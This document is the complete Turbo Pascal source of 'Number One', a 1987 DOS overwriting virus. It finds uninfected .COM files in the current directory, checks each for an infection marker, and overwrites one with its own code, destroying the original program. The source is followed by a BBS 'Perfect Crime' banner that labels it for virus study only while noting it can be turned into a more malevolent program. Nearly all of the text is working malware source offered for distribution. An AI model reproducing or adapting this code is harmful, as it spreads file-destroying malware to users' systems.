

{
-----------------------------------------------------------

  Number One

  This is a very primitive computer virus.

  HANDLE WITH CARE!    ---  Demonstration ONLY!

       Number One infects all .COM - files in the
       CURRENT directory.
       A warning message and the infected file's name will
       be displayed.
       That file has been overwritten with Number One's
       program code and is not reconstructable!
       If all files are infected or no .COM - files found,
       Number One gives you a <smile>.
       Files may be protected against infections of
       Number One
       by setting the READ ONLY attribute.

  Written 10.3.1987 by M.Vallen (Turbo-Pascal 3.01A)
  (c) 1987 by M.Vallen

 ---------------------------------------------------------
}

{C-}
{U-}
{I-}  { Do not allow an user break, enable IO check}

{ -- Constants -------------------------------------------}

Const
     VirusSize = 12027;           { Numer One's code size }

     Warning   : String[42]             { Warning message }
     = 'This file has been infected by Number One!';

{ -- Type declarations -----------------------------------}

Type
    DTARec    = Record                    { Data area for }
    DOSnext : Array[1..21] of Byte;       { file search }
                  Attr    : Byte;
                  FTime,
                  FDate,
                  FLsize,
                  FHsize  : Integer;
                  FullName: Array[1..13] of Char;
                End;

Registers   = Record { Register set used for file search }
   Case Byte of
   1 : (AX,BX,CX,DX,BP,SI,DI,DS,ES,Flags : Integer);
   2 : (AL,AH,BL,BH,CL,CH,DL,DH          : Byte);
   End;

{ -- Variables------------------------------------------ }

Var
                { Memory offset of program code }
   ProgramStart : Byte absolute Cseg:$100;
                { Infection marker }
   MarkInfected : String[42] absolute Cseg:$180;
   Reg          : Registers;              { Register set }
   DTA          : DTARec;                 { Data area    }
   Buffer       : Array[Byte] of Byte;    { Data buffer  }
   TestID       : String[42];{To recognize infected files}
   UsePath      : String[66];     { Path to search files }
                { Length of search path }
   UsePathLength: Byte absolute UsePath;
   Go           : File;                 { File to infect }
   B            : Byte;                           { Used }

{ -- Program code -------------------------------------- }

Begin
  Writeln(Warning);            { Display warning message }
  GetDir(0, UsePath);          { Get current directory   }
  if Pos('\', UsePath) <> UsePathLength then
    UsePath := UsePath + '\';
  UsePath := UsePath + '*.COM';     { Define search mask }
  Reg.AH := $1A;                       { Setup data area }
  Reg.DS := Seg (DTA);
  Reg.DX := Ofs (DTA);
  MsDos(Reg);
  UsePath[Succ(UsePathLength)]:=#0;{Path must end with #0}
  Reg.AH := $4E;
  Reg.DS := Seg(UsePath);
  Reg.DX := Ofs(UsePath[1]);
  Reg.CX := $ff;        { Set attribut to find ALL files }
  MsDos(Reg);            { Find the first matching entry }
  IF not Odd(Reg.Flags) Then  { If a file found then ... }
    Repeat
      UsePath := DTA.FullName;
      B := Pos(#0, UsePath);
      If B > 0 Then
        Delete(UsePath, B, 255);        { Remove garbage }
      Assign(Go, UsePath);
      Reset(Go);
      If IOresult = 0 Then    { If not IO error then ... }
      Begin
        BlockRead(Go, Buffer, 2);
        Move(Buffer[$80], TestID, 43);
        { Test if file is already infected }
        If TestID <> Warning Then      { If not, then... }
        Begin
          Seek(Go, 0);
          { Mark file as infected and ... }
          MarkInfected := Warning;
          { Infect it  }
         BlockWrite(Go,ProgramStart,Succ(VirusSize shr 7));
          Close(Go);
          { Say what has been done }
          WriteLn(UsePath + ' infected.');
          Halt;                { ... and HALT the program }
        End;
        Close(Go);
      End;
      { The file has already been infected, search next }
      Reg.AH := $4F;
      Reg.DS := Seg(DTA);
      Reg.DX := Ofs(DTA);
      MsDos(Reg);
    { ... Until no more files found }
    Until Odd(Reg.Flags);
 Write('<smile>');
End.

;****************************************************************************;
;                                                                            ;
;                     -=][][][][][][][][][][][][][][][=-                     ;
;                     -=]  P E R F E C T  C R I M E  [=-                     ;
;                     -=]      +31.(o)79.426o79      [=-                     ;
;                     -=]                            [=-                     ;
;                     -=] For All Your H/P/A/V Files [=-                     ;
;                     -=]    SysOp: Peter Venkman    [=-                     ;
;                     -=]                            [=-                     ;
;                     -=]      +31.(o)79.426o79      [=-                     ;
;                     -=]  P E R F E C T  C R I M E  [=-                     ;
;                     -=][][][][][][][][][][][][][][][=-                     ;
;                                                                            ;
;                    *** NOT FOR GENERAL DISTRIBUTION ***                    ;
;                                                                            ;
; This File is for the Purpose of Virus Study Only! It Should not be Passed  ;
; Around Among the General Public. It Will be Very Useful for Learning how   ;
; Viruses Work and Propagate. But Anybody With Access to an Assembler can    ;
; Turn it Into a Working Virus and Anybody With a bit of Assembly Coding     ;
; Experience can Turn it Into a far More Malevolent Program Than it Already  ;
; Is. Keep This Code in Responsible Hands!                                   ;
;                                                                            ;
;****************************************************************************;

</smile></smile>